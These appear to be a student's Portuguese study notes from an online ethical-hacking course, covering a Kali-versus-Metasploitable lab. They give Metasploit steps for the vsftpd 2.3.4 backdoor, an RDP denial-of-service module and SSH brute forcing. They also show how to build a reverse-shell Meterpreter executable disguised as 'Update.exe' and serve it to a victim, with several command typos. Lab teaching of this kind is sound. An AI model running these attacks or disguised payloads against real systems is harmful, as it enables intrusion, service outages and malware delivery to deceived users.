Dio - Técnicas de Exploração de Vulnerabilidades

https://www.youtube.com/watch?v=Vq_8nn70kxg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE


Aqui vamos usar o Kali, para invadir a maquina virtual com o metaexploitable


# DESAFIO DO PROFESSOR
https://github.com/cassiano-dio/cibersecurity-desafio-ransomware


# Explorando Falhas FTP

FTP (File Transfer Protocol) é um protocolo bem antigo (anos 70) usado para transferir arquivos entre cliente e servidor. Funciona na porta 21 (controle) e usa uma porta adicional para dados (ativo ou passivo).

⚠️ Falhas principais do FTP clássico:
• Credenciais em texto puro → usuário e senha podem ser capturados facilmente com sniffing.
• Sem criptografia nativa → os arquivos também viajam abertos pela rede.
• Portas dinâmicas no modo ativo/passivo → complica firewall e pode ser explorado.
• Vulnerável a brute force → como não tem proteção moderna, é alvo fácil.
• Não integra segurança moderna → não tem autenticação forte nem integridade de dados.

👉 Por isso, hoje em dia se usa SFTP (via SSH) ou FTPS (FTP com TLS), que corrigem essas brechas.

## Usaremos o METASPLOIT

Metasploit é uma framework de testes de penetração muito usada por pentesters, red teams e pesquisadores de segurança para explorar vulnerabilidades, gerar payloads e automatizar etapas de ataque e pós-exploração. Foi criada nos anos 2000 e hoje tem versão open-source (Framework) e versão paga (Metasploit Pro).

### Componentes principais

msfconsole — interface principal (CLI).
msfvenom — cria payloads (binários, executáveis, scripts).
Modules — biblioteca de módulos reutilizáveis: exploits, payloads, auxiliary (scanners/fuzzers), post (pós-exploração).
Meterpreter — payload interativo poderoso para pós-exploração (shell avançado, upload/download, pivoteamento).
Banco de dados — integra varreduras (ex.: Nmap) para organizar alvos.

## Payloads

Modulos para exploit, sendo Singles, Stagers, Stages

## Meterpreter

Oi meta-interpreter, é um payloader que funciona por injecção dll

O meterpreter reside interiramente na memoria e não deixa vestigios no disco rigido.

---

# O ataque - Passo a Passo


## Passo 1 
    No Kali, usamos o comando, para iniciar o msf:
    ▶️ msfconsole

## Passo 2
    Localizamos o exploit que vamos usar, ele faz parte da galeria do kali/msf, ▶️ exploit/unix/ftp/vsftpd_234_backdor 

    comando para termos mais informações dele: 
    ▶️ info exploit/unix/ftp/vsftpd_234_backdor
    Esse modul explora um backdor que foi inseriod na versão de June 2011, envenenando uma versão, e versões desatualizadas ainda existem.

## Passo 3 
    Vamos ativar e começar a usar nosso Backdor:     
    ▶️ use exploit/unix/ftp/vsftpd_234_backdor

    Configurar o Ip de destico, Alvo,
    ▶️ set rhosts 192.68.56.100

## Passo 4 Verificar Payload
    Vamos dar uma olhada para selecionar os Payloads, comando:
    ▶️ Show payloads

    Configurar o payload que vamos usar
    ▶️ set payloads payload/cmd/unix/interact

## Passo 5 - Rodar
    Com tudo configurado aqui até agora, podemos rodar com o comando:
    ▶️ exploit

    aqui nois ja esta dentro do sistema alvo.

---

# ETAPA 2 ATAQUE DoS no RDP

youtube.com/watch?v=bVn6Dj4Z8ls&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

"" Um ataque DoS em RDP visa tornar o serviço indisponível para usuários legítimos, geralmente por flood de conexões, autenticações ou pacotes malformados que esgotam CPU, memória ou travam o serviço, causando indisponibilidade e perda de produtividade; as principais mitigação incluem habilitar NLA e MFA, colocar o RDP atrás de VPN ou RDP Gateway, aplicar rate limiting e firewall, manter o servidor atualizado e monitorar logs e conexões para detectar atividades anômalas.
""
    Vamos fazer um ataque de negação de serviço, em um Remote Desktop Conection,

    A Maldade que vamos usar
▶️ auxiliary/doc/windows/rd@/ms12_020_maxchannelids

# Etapa 3 - Explorando falhas SSH

https://www.youtube.com/embed/uIizaBULfq4?controls=0&disablekb=1&enablejsapi=1&fs=0&iv_load_policy=3&modestbranding=1&showinfo=0&rel=0&html5=1&cc_load_policy=0&origin=https%3A%2F%2Fweb.dio.me&widgetid=1&forigin=https%3A%2F%2Fweb.dio.me%2Ftrack%2Fsantander-ciberseguranca-2025%2Fcourse%2Fexploracao%2Flearning%2F280a133f-d590-4c80-964a-a45b49781159%3Fautoplay%3D1&aoriginsup=1&vf=6

▶Lembre-se, entre no console
▶️ msfconsole

▶️search ssh_login
    Esse cara aqui vai nos ajudar a invadir, ao forçar login com wordlist

Comando, nos permite vizulizar as coneções que estamos conectados.
▶️ Sessions

# ETAPA 4 - Adicionar Backdoor em um executavel

https://www.youtube.com/watch?v=zDINc08S6eg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

Mascaremos nosso Backdor em um executavel, temos varios tipos de ataques para executar quando conseguimos um backdor, monitorar todo o computador para faze-lo funcionar

Usar o Meta-interpreter, é um payloader, e ele só existirar dentro da memoria e não do disco rigido 


## Passo 1 - Ligar o Kali e o Alvo(windows)

Para criar nosso executavle malicioso usaremos o msfvenom
    Comando  -   Payload
▶️ msfvenom -p windows/meterpreter/reverse_tcp -a x86 plataform windows -f exe LHOST=192.168.56.103 LPORT=4444 -o Update.exe

🟡 O que cada parte significa

🟡 msfvenom — ferramenta do Metasploit para gerar payloads (binários, shellcode, scripts).

🟡-p windows/meterpreter/reverse_tcp — payload escolhido: Meterpreter para Windows que faz reverse TCP (o alvo conecta de volta ao atacante).

🟡-a x86 — arquitetura do payload: x86 (32-bit). Use x64 se for 64-bit.

🟡--platform windows — plataforma alvo: Windows.

🟡-f exe — formato de saída: executável Windows (.exe).

🟡LHOST=192.168.56.103 — IP do atacante/listener (onde o payload deve conectar). Aqui é o IP da sua máquina de lab.

🟡LPORT=4444 — porta do listener que ficará aguardando a conexão (a mesma no handler).
🟡-o Update.exe — nome do arquivo gerado (escrito no disco): Update.exe.


Criamos um executavel maldozo ja, agora é só passar o idiota para traz, digo cliente desatento.


    Aqui vamos iniciar um servidor para fazer a maldade.
▶️service apache2 start

▶️cp Update.exe /var/www/html

Para gerar a sessão com o usuario e fazer a maldade
Temos que ativar o 
▶️ mfsconsole
▶️ use multi/handler
▶️ set payload windowns/meterpreter/reverse_tcp
▶️ info 
    Para o meterprecer poder escutar definimos o LHOST
▶️ set LHOST Ip Minha maquina
▶️ set LPORT 4444 (( Mesma porta setada no Viruz))